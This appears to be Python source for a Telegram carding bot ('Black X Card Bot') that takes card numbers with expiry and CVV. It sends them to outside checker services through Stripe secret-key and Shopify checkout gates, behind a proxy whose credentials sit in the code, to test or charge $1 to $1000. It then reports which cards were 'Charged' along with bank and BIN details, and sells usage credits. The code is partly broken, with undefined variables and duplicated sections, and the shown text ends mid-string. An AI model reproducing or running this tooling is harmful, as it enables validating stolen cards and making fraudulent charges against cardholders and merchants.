# ==================== IMPORTS SECTION ====================
import sys
import os
import asyncio
import signal
import time
import logging
import re
import json
import uuid
import random
import pytz
import psutil
import aiohttp
from datetime import datetime, timedelta
from html import escape
from io import BytesIO
from faker import Faker

# Telegram imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder, 
    CommandHandler, 
    ContextTypes, 
    MessageHandler, 
    CallbackQueryHandler,
    filters,
    ApplicationHandlerStop
)
from telegram.error import BadRequest, NetworkError, TelegramError

# Custom imports
from braintree1 import b3_iditarod_command as b3_command
from db import get_user, update_user, init_db
from config import ADMIN_IDS, TOKEN, OWNER_ID
from masspp import masspp_command, register_masspp_handlers
from force_join import check_joined_callback, force_join
from scr import initialize_scraper, scr_command, mc_command, clean_command
from sktxt import sktxt_command, register_sktxt_handlers
from mstripe import chktxt_command, register_mstripe_callbacks
from MassShopify import mtxt_command, stop_mtxt_handler


# === CONFIGURATION ===
TOKEN = "8408512177:"
OWNER_ID = 7254736651
ADMIN_IDS = {7254736651, }  # Add admin user IDs here
AUTHORIZATION_CONTACT = "@Blinkisop"
OFFICIAL_GROUP_LINK = "https://t.me/BlinkXChat"
DEFAULT_FREE_CREDITS = 200

# --- GLOBAL STATE (In-Memory) ---
user_last_command = {}
AUTHORIZED_CHATS = set()
AUTHORIZED_PRIVATE_USERS = set()
REDEEM_CODES = {} # New dictionary to store redeem codes
USER_DATA_DB = {
    OWNER_ID: {
        'credits': 9999,
        'plan': 'PLUS',
        'status': 'Owner',
        'plan_expiry': 'N/A',
        'keys_redeemed': 0,
        'registered_at': '03-08-2025'
    }
}
# Initialize Faker
fake = Faker()

# === LOGGING SETUP ===
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# === HELPER FUNCTIONS ===
def escape_markdown_v2(text: str) -> str:
    """Escapes markdown v2 special characters."""
    special_chars = r"([_*\[\]()~`>#+\-=|{}.!])"
    return re.sub(special_chars, r"\\\1", text)

def get_level_emoji(level):
    level_lower = level.lower()
    if "gold" in level_lower:
        return "🌟"
    elif "platinum" in level_lower:
        return "💎"
    elif "premium" in level_lower:
        return "✨"
    elif "infinite" in level_lower:
        return "♾️"
    elif "corporate" in level_lower:
        return "💼"
    elif "business" in level_lower:
        return "📈"
    elif "standard" in level_lower or "classic" in level_lower:
        return "💳"
    return "💡"

def get_vbv_status_display(status):
    if status is True:
        return "✅ LIVE"
    elif status is False:
        return "❌ DEAD"
    else:
        return "🤷 N/A"

def luhn_checksum(card_number):
    """Checks if a credit card number is valid using the Luhn algorithm."""
    digits = [int(d) for d in card_number if d.isdigit()]
    total = 0
    num_digits = len(digits)
    parity = num_digits % 2
    for i, digit in enumerate(digits):
        if i % 2 == parity:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

from db import get_user, update_user  # your async DB functions
from datetime import datetime

DEFAULT_FREE_CREDITS = 200
DEFAULT_PLAN = "Free"
DEFAULT_STATUS = "Free"
DEFAULT_PLAN_EXPIRY = "N/A"
DEFAULT_KEYS_REDEEMED = 0

async def get_user_data(user_id):
    """
    Fetch user data from DB; if not exists, create with defaults then fetch.
    """
    user_data = await get_user(user_id)
    if not user_data:
        now_str = datetime.now().strftime('%d-%m-%Y')
        # Insert new user with defaults
        await update_user(
            user_id,
            credits=DEFAULT_FREE_CREDITS,
            plan=DEFAULT_PLAN,
            status=DEFAULT_STATUS,
            plan_expiry=DEFAULT_PLAN_EXPIRY,
            keys_redeemed=DEFAULT_KEYS_REDEEMED,
            registered_at=now_str
        )
        # Fetch again after insertion
        user_data = await get_user(user_id)
    return user_data


async def consume_credit(user_id: int) -> bool:
    """
    Deduct 1 credit if available. Return True if succeeded.
    """
    user_data = await get_user_data(user_id)
    if user_data and user_data.get('credits', 0) > 0:
        new_credits = user_data['credits'] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


async def add_credits_to_user(user_id: int, amount: int):
    """
    Add credits to user, creating user if needed.
    Return updated credits or None if failure.
    """
    user_data = await get_user_data(user_id)
    if not user_data:
        return None
    new_credits = user_data.get('credits', 0) + amount
    await update_user(user_id, credits=new_credits)
    return new_credits


async def enforce_cooldown(user_id: int, update: Update) -> bool:
    """Enforces a 5-second cooldown per user."""
    current_time = time.time()
    last_command_time = user_last_command.get(user_id, 0)
    if current_time - last_command_time < 5:
        await update.effective_message.reply_text("⏳ Please wait 5 seconds before retrying\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return False
    user_last_command[user_id] = current_time
    return True

from config import OWNER_ID  # Ensure OWNER_ID is loaded from environment or config


# === CONFIG ===
user_last_command = {}
AUTHORIZED_CHATS = set((-1003173403820,-1002991330386,-1002932611857,-1003459867774,-1002148504102,6550643168,-1002981544233,-1002769657415,-1003326306608))  

# List of your bot commands
BOT_COMMANDS = [
    "/start", "/cmds", "/gen", "/bin", "/chk", "/mchk", "/mass",
    "/mtchk", "/fk", "/fl", "/open", "/status", "/credits", "/info"
    "/scr", "/sh", "/add", "/sh", "scr", "/remove", "/b3" "/check"
    "/vbv", "/mvbv",
]

from telegram.ext import ApplicationHandlerStop

async def group_filter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    message = update.effective_message

    # Only check in groups
    if chat.type in ["group", "supergroup"]:
        # If the group is NOT the authorized group
        if chat.id != AUTHORIZED_GROUP_ID:
            if message.text:
                cmd = message.text.split()[0].lower()
                if cmd in BOT_COMMANDS:
                    await message.reply_text(
                        f"🚫 This group is not authorized to use this bot.\n\n"
                        f"📩 Contact {AUTHORIZATION_CONTACT} to get access.\n"
                        f"🔗 Official group: {OFFICIAL_GROUP_LINK}"
                    )
                    # Stop other handlers from running
                    raise ApplicationHandlerStop
    # In private or the authorized group → do nothing, commands continue

# --- GLOBAL STATE ---
# Add your authorized group IDs here

BOT_COMMANDS = [
    "start", "cmds", "gen", "bin", "chk", "mchk", "mass",
    "mtchk", "fk", "fl", "open", "status", "credits", "info"
    "scr", "sh", "add", "sp", "scr", "remove", "b3", "site"
    "vbv", "mvbv"
]

async def back_to_start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler to go back to the main menu."""
    q = update.callback_query
    await q.answer()
    
    user = q.from_user
    
    try:
        # Get user data
        user_data = await get_user(user.id)
        plan = str(user_data.get("plan", "Free")).upper()
        
        # Determine user role
        if user.id == OWNER_ID:
            user_role = "OWNER"
            role_emoji = "🦂"
        elif user.id in ADMIN_IDS:
            user_role = "ADMIN"
            role_emoji = "🧠"
        elif "PREMIUM" in plan.upper():
            user_role = "PREMIUM"
            role_emoji = "💎"
        elif "PLUS" in plan.upper():
            user_role = "PLUS"
            role_emoji = "🌞"
        else:
            user_role = "FREE"
            role_emoji = "⌚"
        
        # User name
        user_full_name = user.first_name or "User"
        if user.last_name:
            user_full_name += f" {user.last_name}"
        
        # FIRST LINE: User name + [Plan]
        first_line = f"<b>{user_full_name}</b>  [{user_role} {role_emoji}]"
        
        # FINAL TEXT (SAME AS START MESSAGE)
        text = (
            f"🌟 𝙃𝙚𝙡𝙡𝙤 {first_line}\n\n"
            "💎 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 𝑩𝒍𝒂𝒄𝒌 𝒙 𝑪𝒂𝒓𝒅 𝘽𝙤𝙩\n\n"
            
            "𝑰 𝒂𝒎 𝒚𝒐𝒖𝒓 𝒈𝒐-𝒕𝒐 𝒃𝒐𝒕, 𝒑𝒂𝒄𝒌𝒆𝒅 𝒘𝒊𝒕𝒉 𝒂 𝒗𝒂𝒓𝒊𝒆𝒕𝒚 𝒐𝒇 𝒈𝒂𝒕𝒆𝒔, "
            "𝒕𝒐𝒐𝒍𝒔, 𝒂𝒏𝒅 𝒄𝒐𝒎𝒎𝒂𝒏𝒅𝒔 𝒕𝒐 𝒆𝒏𝒉𝒂𝒏𝒄𝒆 𝒚𝒐𝒖𝒓 𝒆𝒙𝒑𝒆𝒓𝒊𝒆𝒏𝒄𝒆. "
            "𝑬𝒙𝒄𝒊𝒕𝒆𝒅 𝒕𝒐 𝒔𝒆𝒆 𝒘𝒉𝒂𝒕 𝑰 𝒄𝒂𝒏 𝒅𝒐?\n\n"
            
            "💎 𝙏𝙝𝙖𝙣𝙠 𝙔𝙤𝙪 𝙁𝙤𝙧 𝘾𝙝𝙤𝙤𝙨𝙞𝙣𝙜 𝘽𝙡𝙖𝙘𝙠 𝙓 𝘾𝙖𝙧𝙙 𝘽𝙤𝙩\n"
            "👇 𝘾𝙡𝙞𝙘𝙠 𝙏𝙝𝙚 𝘽𝙪𝙩𝙩𝙤𝙣 𝙏𝙤 𝘼𝙘𝙘𝙚𝙨 𝙈𝙮 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝘀."
        )
        
        # Keyboard
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("𝙂𝙖𝙩𝙚𝙨", callback_data="gates_menu"),
             InlineKeyboardButton("𝙏𝙤𝙤𝙡𝙨", callback_data="tools_menu")],
            [InlineKeyboardButton("𝑶𝒘𝒏𝒆𝒓", url="tg://resolve?domain=BlinkCarder")]
        ])
        
        # Try to edit message
        try:
            await q.edit_message_caption(
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
            )
        except Exception as e:
            logger.warning(f"Failed to edit caption, sending new message: {e}")
            # Send new photo message
            photo_url = "https://i.ibb.co/93nHh5Xj/IMG-20251104-185218-529.jpg"
            await q.message.reply_photo(
                photo=photo_url,
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
            )
            
    except Exception as e:
        logger.error(f"Error in back_to_start_handler: {e}")
        # Simple fallback
        await q.message.reply_text(
            "🌟 Welcome back! Use buttons below.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("𝙂𝙖𝙩𝙚𝙨", callback_data="gates_menu"),
                 InlineKeyboardButton("𝙏𝙤𝙤𝙡𝙨", callback_data="tools_menu")],
                [InlineKeyboardButton("𝑶𝒘𝒏𝒆𝒓", url="tg://resolve?domain=BlinkCarder")]
            ])
        )

# All Sk Based #

# =============================================
# SK-Based COMMANDS - ADD THIS AT THE END OF FILE (BEFORE main() function)
# =============================================

import aiohttp
import json
import logging
import asyncio
from datetime import datetime
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import re

logger = logging.getLogger(__name__)

# ===== Custom SK Amount System =====
user_custom_amounts = {}

# Yeh code SK-Based section mein add karo (rps_command ke baad)
async def ps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle both amount setting and card checking"""
    user_id = update.effective_user.id
    
    # Agar koi argument nahi hai
    if not context.args:
        current_amount = user_custom_amounts.get(user_id)
        if current_amount:
            await update.message.reply_text(
                f"💰 <b>Current amount: ${current_amount}</b>\n\n"
                f"To check card: <code>/ps card|mm|yy|cvv</code>\n"
                f"To change amount: <code>/ps &lt;amount&gt;</code>\n"
                f"To reset amount: <code>/rps</code>",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                "❌ <b>No custom amount set!</b>\n\n"
                "First: <code>/ps 10</code> (set $10)\n"
                "Then: <code>/ps card|mm|yy|cvv</code>\n"
                "Reset: <code>/rps</code>",
                parse_mode=ParseMode.HTML
            )
        return

    # Agar argument hai
    args_text = " ".join(context.args)
    
    # Check if it's a card (contains numbers and |)
    if re.search(r"\d{12,19}.*\|.*\d{1,2}.*\|.*\d{2,4}.*\|.*\d{3,4}", args_text):
        # It's a card - process it
        if user_id not in user_custom_amounts:
            await update.message.reply_text(
                "❌ <b>Please set amount first!</b>\n\n"
                "Usage: <code>/ps &lt;amount&gt;</code>\n"
                "Example: <code>/ps 10</code> for $10 charge",
                parse_mode=ParseMode.HTML
            )
            return
            
        custom_amount = user_custom_amounts[user_id]
        match = re.search(r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b", args_text)
        if match:
            card, mm, yy, cvv = match.groups()
            mm = mm.zfill(2)
            yy = yy[-2:] if len(yy) == 4 else yy
            payload = f"{card}|{mm}|{yy}|{cvv}"
            await process_sk_charge(update, context, payload, custom_amount, "ps")
        else:
            await update.message.reply_text(
                "❌ <b>Invalid card format!</b>\n\n"
                "Usage: <code>/ps card|mm|yy|cvv</code>",
                parse_mode=ParseMode.HTML
            )
    
    else:
        # It's an amount - set it
        try:
            amount = int(context.args[0])
            if amount <= 0 or amount > 1000:
                await update.message.reply_text(
                    "❌ <b>Amount must be between 1 and 1000 dollars.</b>",
                    parse_mode=ParseMode.HTML
                )
                return
            
            user_custom_amounts[user_id] = amount
            await update.message.reply_text(
                f"✅ <b>Custom amount set to ${amount}</b>\n\n"
                f"Now use: <code>/ps card|mm|yy|cvv</code>\n"
                f"To charge <b>${amount}</b>",
                parse_mode=ParseMode.HTML
            )
        except ValueError:
            await update.message.reply_text(
                "❌ <b>Please provide a valid number (1-1000) or a card.</b>\n\n"
                "Examples:\n"
                "<code>/ps 10</code> - Set $10 amount\n"
                "<code>/ps card|mm|yy|cvv</code> - Check card",
                parse_mode=ParseMode.HTML
            )

async def rps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reset custom amount"""
    user_id = update.effective_user.id
    
    if user_id in user_custom_amounts:
        del user_custom_amounts[user_id]
        await update.message.reply_text(
            "✅ <b>Custom amount reset.</b>\n"
            "Use <code>/ps &lt;amount&gt;</code> to set new amount.",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            "❌ <b>You don't have any custom amount set.</b>",
            parse_mode=ParseMode.HTML
        )
# ===== SK-Based $1 Command (/cc) =====
async def cc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """SK-Based $1 Charge"""
    user = update.effective_user

    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    if context.args:
        raw_text = " ".join(context.args).strip()
        match = re.search(r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b", raw_text)
        if match:
            card_input = match.groups()

    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = re.search(r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b", update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    if not card_input:
        await update.message.reply_text("⚠️ Usage: <code>/cc card|mm|yy|cvv</code>\nOr reply to a message containing a card.", parse_mode=ParseMode.HTML)
        return

    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    payload = f"{card}|{mm}|{yy}|{cvv}"

    await process_sk_charge(update, context, payload, 1, "cc")

# ===== SK-Based $5 Command (/su) =====
async def su_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """SK-Based $5 Charge"""
    user = update.effective_user

    if not await enforce_cooldown(user.id, update):
        return

    card_input = None

    if context.args:
        raw_text = " ".join(context.args).strip()
        match = re.search(r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b", raw_text)
        if match:
            card_input = match.groups()

    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = re.search(r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b", update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    if not card_input:
        await update.message.reply_text("⚠️ Usage: <code>/su card|mm|yy|cvv</code>\nOr reply to a message containing a card.", parse_mode=ParseMode.HTML)
        return

    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    payload = f"{card}|{mm}|{yy}|{cvv}"

    await process_sk_charge(update, context, payload, 5, "su")

# ===== MAIN SK PROCESSING FUNCTION =====
async def process_sk_charge(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str, amount: int, cmd_type: str):
    """Process SK-Based charge"""
    import time
    start_time = time.time()
    processing_msg = None

    try:
        user = update.effective_user

        if not await consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits left.")
            return

        parts = payload.split("|")
        if len(parts) != 4:
            await update.message.reply_text("❌ Invalid card format.")
            return

        cc, mm, yy, cvv = [p.strip() for p in parts]
        full_card = f"{cc}|{mm}|{yy}|{cvv}"
        escaped_card = escape(full_card)

        BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">⩙</a>'

        processing_text = (
            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
            f"<pre><code>{escaped_card}</code></pre>\n\n"
            f"<b>Gateway ➵ 𝐒𝐊-𝐁𝐚𝐬𝐞𝐝 ${amount}</b>\n"
        )

        processing_msg = await update.message.reply_text(processing_text, parse_mode=ParseMode.HTML)

        # API request
        api_url = f"https://ravenxchecker.site/check/skb.php?sk={stripe_key}&amount={amount}&lista={full_card}"

        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                api_response = await resp.text()

        try:
            data = json.loads(api_response)
        except json.JSONDecodeError:
            await processing_msg.edit_text(f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>", parse_mode=ParseMode.HTML)
            return

        ok_status = data.get("ok", False)
        decline_code = data.get("decline_code", "")
        message = data.get("message", "Unknown")

        # BIN lookup
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except Exception as e:
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
        DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
        DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'

        # Determine status
        if ok_status:
            header_status = "🔥 Charged"
            display_response = f"✅ Approved - {escape(message)}"
        else:
            if "decline" in decline_code.lower() or "declined" in message.lower():
                header_status = "❌ Declined"
                display_response = f"❌ {escape(message)}"
            else:
                header_status = "❌ Declined"
                display_response = f"❌ {escape(message)}"

        elapsed_time = round(time.time() - start_time, 2)

        final_text = (
            f"<b><i>{header_status}</i></b>\n\n"
            f"𝐂𝐚𝐫𝐝\n⤷ <code>{escaped_card}</code>\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐒𝐊-𝐁𝐚𝐬𝐞𝐝 ${amount}\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{display_response}</code></i>\n\n"
            f"<pre>𝑩𝒓𝒂𝒏𝒅 ↬ {escape(brand)}\n"
            f"𝑩𝒂𝒏𝒌 ↬ {escape(issuer)}\n"
            f"𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ↬ {escape(country_name)} {country_flag}</pre>\n\n"
            f"𝐃𝐄𝐕 ↬ {developer_clickable}\n"
            f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ↬ {elapsed_time}s"
        )

        await processing_msg.edit_text(final_text, parse_mode=ParseMode.HTML)

    except Exception as e:
        logger.exception(f"Error in processing SK charge")
        try:
            if processing_msg:
                await processing_msg.edit_text(f"❌ Error: <code>{escape(str(e))}</code>", parse_mode=ParseMode.HTML)
        except Exception:
            pass

# ===== SK-Based MENU HANDLER =====
async def sk_based_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback handler for the 'SK-Based' button."""
    q = update.callback_query
    await q.answer()
    BULLET_GROUP_LINK = "https://t.me/BlackXCards"
    bullet_link = f"<a href='{BULLET_GROUP_LINK}'>⩙</a>"

    text = (
        "🔎━━ 𝐒𝐊-𝐁𝐚𝐬𝐞𝐝 𝐋𝐨𝐨𝐤𝐔𝐏 ━━💳\n\n"
        f"{bullet_link} <b>SK-Based $1 Charge</b>\n"
        f"⤷ 𝐂𝐌𝐃: <code>/cc card|mm|yy|cvv</code>\n"
        f"⤷ 𝐏𝐫𝐢𝐜𝐞: $1.00\n\n"
        
        f"{bullet_link} <b>SK-Based $5 Charge</b>\n"
        f"⤷ 𝐂𝐌𝐃: <code>/su card|mm|yy|cvv</code>\n"
        f"⤷ 𝐏𝐫𝐢𝐜𝐞: $5.00\n\n"
        
        f"{bullet_link} <b>SK-Based Custom Amount</b>\n"
        f"⤷ 𝐒𝐞𝐭 𝐀𝐦𝐨𝐮𝐧𝐭: <code>/ps &lt;amount&gt;</code>\n"
        f"⤷ 𝐔𝐬𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝: <code>/ps card|mm|yy|cvv</code>\n"
        f"⤷ 𝐑𝐞𝐬𝐞𝐭 𝐀𝐦𝐨𝐮𝐧𝐭: <code>/rps</code>\n"
        f"⤷ 𝐑𝐚𝐧𝐠𝐞: $1 - $1000\n\n"
        
        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>SK-Based Stripe</i>\n"
        "✦══════════════════════✦"
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
    ])

    try:
        await q.edit_message_caption(
            caption=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.warning(f"Failed to edit message, sending a new one: {e}")
        await q.message.reply_text(
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=keyboard,
            disable_web_page_preview=True
        )

from telegram.ext import ApplicationHandlerStop, filters

async def group_filter(update, context):
    chat = update.effective_chat
    message = update.effective_message

    # Only check commands in groups
    if chat.type in ["group", "supergroup"]:
        if chat.id not in AUTHORIZED_CHATS:
            # Check if the message contains a command
            if message.entities:
                for ent in message.entities:
                    if ent.type == "bot_command":
                        # Extract command without the "/"
                        cmd_text = message.text[ent.offset+1 : ent.offset+ent.length].split("@")[0].lower()
                        if cmd_text in BOT_COMMANDS:
                            await message.reply_text(
                                f"🚫 This group is not authorized to use this bot.\n\n"
                                f"📩 Contact {AUTHORIZATION_CONTACT} to get access.\n"
                                f"🔗 Official group: {OFFICIAL_GROUP_LINK}"
                            )
                            # Stop other handlers (so the command is not executed)
                            raise ApplicationHandlerStop
    # Private chats or authorized groups → do nothing


from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    filters,
)

closed_commands = set()

# Check if command is closed
async def check_closed_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cmd = update.message.text.split()[0][1:].split("@")[0].lower()
    if cmd in closed_commands:
        await update.message.reply_text(
            "🚧 𝗚𝗮𝘁𝗲 𝗨𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 𝗘𝘅𝗰𝗶𝘁𝗶𝗻𝗴 𝗨𝗽𝗱𝗮𝘁𝗲𝘀 𝗔𝗿𝗲 𝗼𝗻 𝘁𝗵𝗲 𝗪𝗮𝘆! 🚧"
        )
        return False  # Block command
    return True  # Allow command

# /close
async def close_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /close <command>")
        return
    closed_commands.add(context.args[0].lower())
    await update.message.reply_text(f"The /{context.args[0]} command is now closed.")

# /restart
async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /restart <command>")
        return
    closed_commands.discard(context.args[0].lower())
    await update.message.reply_text(f"The /{context.args[0]} command is now available.")


# Wrapper to block closed commands
def command_with_check(handler_func, command_name):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if command_name in closed_commands:
            await update.message.reply_text(
                "🚧 𝗚𝗮𝘁𝗲 𝗨𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲 𝗘𝘅𝗰𝗶𝘁𝗶𝗻𝗴 𝗨𝗽𝗱𝗮𝘁𝗲𝘀 𝗔𝗿𝗲 𝗼𝗻 𝘁𝗵𝗲 𝗪𝗮𝘆! 🚧"
            )
            return
        await handler_func(update, context)
    return wrapper

# Single Auto Shoppiy #
import re
import asyncio
import aiohttp
import json
import time
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Card regex pattern
SH_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

async def sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # Cooldown check
    if not await enforce_cooldown(user_id, update):
        return

    card_input = None

    # Check arguments or reply message
    if context.args:
        raw_text = " ".join(context.args).strip()
        match = SH_CARD_REGEX.search(raw_text)
        if match:
            card_input = match.groups()
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = SH_CARD_REGEX.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    if not card_input:
        await update.message.reply_text(
            "𝙁𝙤𝙧𝙢𝙚𝙩 ➜ /sh 4111111111111111|12|2025|123\n\n"
            "𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤",
            parse_mode=ParseMode.HTML
        )
        return

    # Normalize card
    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    normalized_card = f"{card}|{mm}|{yy}|{cvv}"

    # Check credits
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ <b>INSUFFICIENT CREDITS</b>", parse_mode=ParseMode.HTML)
        return

    # Get user sites - YEH LINE ADD KARNA THA
    user_data = await get_user(user_id)
    custom_urls = user_data.get("custom_urls", [])

    if not custom_urls:
        await update.message.reply_text(
            "𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙐𝙍𝙇𝙨. 𝙁𝙞𝙧𝙨𝙩 𝙖𝙙𝙙 𝙪𝙨𝙞𝙣𝙜 /add",
            parse_mode=ParseMode.HTML
        )
        return

    # Processing message - sirf egg emoji
    msg = await update.message.reply_text("🍳")
    
    # Run in background
    asyncio.create_task(process_auto_shopify(user, normalized_card, custom_urls, msg))

async def process_auto_shopify(user, card_input, custom_urls, msg):
    """Process Auto Shopify check across all user sites"""
    start_time = time.time()
    
    try:
        cc = card_input.split("|")[0]
        escaped_card = escape(card_input)

        # BIN lookup
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)
            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
        except:
            brand = issuer = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # API Template
        API_TEMPLATE = (
            "https://autoshopify.stormx.pw/index.php"
            "?site={site}"
            "&cc={card}"
            "&proxy=pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
        )

        # Check all sites
        best_result = None
        site_number = 0

        async def check_site(site):
            nonlocal best_result, site_number
            site_number += 1
            if not site.startswith(("http://", "https://")):
                site = "https://" + site
            
            api_url = API_TEMPLATE.format(site=site, card=card_input)
            
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(api_url, timeout=30) as resp:
                        api_text = await resp.text()
                
                # Clean response
                clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
                json_start = clean_text.find('{')
                if json_start != -1:
                    clean_text = clean_text[json_start:]
                
                data = json.loads(clean_text)
                response = data.get("Response", "")
                price = data.get("Price", 0)
                gateway = data.get("Gateway", "Shopify")

                # Determine best result
                resp_upper = str(response).upper()
                if best_result is None:
                    best_result = {
                        **data, 
                        "site": site,
                        "site_number": site_number
                    }
                else:
                    prev_resp = best_result.get("Response", "").upper()
                    
                    # Priority: Charged > Approved > Others
                    charged_patterns = [
                        "ORDER CONFIRMED", "ORDER PLACED", "THANK YOU", 
                        "SUCCESS", "APPROVED", "CHARGED", "PAYMENT SUCCESS", "ORDER CONFIRMED!"
                    ]
                    
                    current_charged = any(pattern in resp_upper for pattern in charged_patterns)
                    prev_charged = any(pattern in prev_resp for pattern in charged_patterns)
                    
                    if current_charged and not prev_charged:
                        best_result = {
                            **data, 
                            "site": site,
                            "site_number": site_number
                        }
                    elif "APPROVED" in resp_upper and not prev_charged:
                        best_result = {
                            **data, 
                            "site": site,
                            "site_number": site_number
                        }

            except:
                return

        # Run checks concurrently
        await asyncio.gather(*(check_site(site) for site in custom_urls))

        if not best_result:
            elapsed_time = round(time.time() - start_time, 2)
            final_text = (
                f"<s>𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿</s> ❌\n\n"
